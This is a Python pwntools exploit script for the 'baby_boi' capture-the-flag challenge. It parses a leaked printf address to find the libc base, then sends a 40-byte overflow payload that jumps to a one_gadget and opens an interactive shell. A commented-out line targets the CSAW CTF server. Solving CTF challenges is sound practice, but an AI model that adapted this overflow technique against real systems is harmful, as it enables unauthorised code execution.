#!/bin/python

import pwn


PRINTF_OFFSET = 0x64e80
ONE_GADGET_OFFSET = 0x4f322  # [rsp+0x40] == NULL


def main():
    p = pwn.process("./baby_boi")
    # p = pwn.remote("pwn.chal.csaw.io", 1005)

    data = p.recvrepeat(0.2)

    while not data:
        data = p.recvrepeat(0.2)

    leak = data[data.find(": ")+2:data.rfind("\n")]

    pwn.log.info("Leaked printf() address: {printf_addr}".format(printf_addr=leak))

    printf_addr = int(leak, 16)
    libc_base = printf_addr - PRINTF_OFFSET
    one_gadget_addr = libc_base + ONE_GADGET_OFFSET

    payload = "A" * 40
    payload += pwn.p64(one_gadget_addr)
    payload = payload.ljust(150, "\x00")

    p.sendline(payload)
    p.interactive()


if __name__ == "__main__":
    main()
